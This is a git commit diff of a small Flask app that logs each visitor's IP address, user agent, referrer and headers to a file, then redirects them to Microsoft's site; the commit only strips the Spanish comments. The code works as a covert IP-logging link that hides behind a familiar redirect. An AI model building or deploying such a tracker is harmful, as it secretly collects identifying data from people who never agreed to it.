46a0d67d8701022347749887bf796561999451e6
XxAtomm <92411982+xxatomm@users.noreply.github.com>
2024-11-11 01:37:24 -0500

    app.py

--- app.py
+++ app.py
@@ -6,7 +6,6 @@ app = Flask(__name__)
 
 @app.route('/')
 def log_visitor():
-    # Obtener la dirección IP del visitante y otros datos
     ip_address = request.remote_addr
     user_agent = request.headers.get('User-Agent')
     referrer = request.referrer if request.referrer else "Sin referer"
@@ -15,11 +14,9 @@ def log_visitor():
     headers = dict(request.headers)
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     
-    # Obtener la IP y el nombre de host del servidor
     server_ip = socket.gethostbyname(socket.gethostname())
     server_host = socket.gethostname()
 
-    # Crear la entrada de registro con la información obtenida
     log_entry = f"""
 --- NUEVO REGISTRO ---
 Fecha y Hora: {timestamp}
@@ -34,13 +31,10 @@ IP del Servidor: {server_ip}
 Nombre del Host del Servidor: {server_host}
 -----------------------
 """
-    # Guardar la entrada de registro en un archivo de texto
     with open('logs.txt', 'a') as log_file:
         log_file.write(log_entry)
 
-    # Redirigir al usuario a la página de Microsoft
     return redirect('https://www.microsoft.com/es-pe', code=302)
 
 if __name__ == '__main__':
-    # Este es el lugar donde debes poner la ejecución de Flask
     app.run(host='0.0.0.0', port=5000)
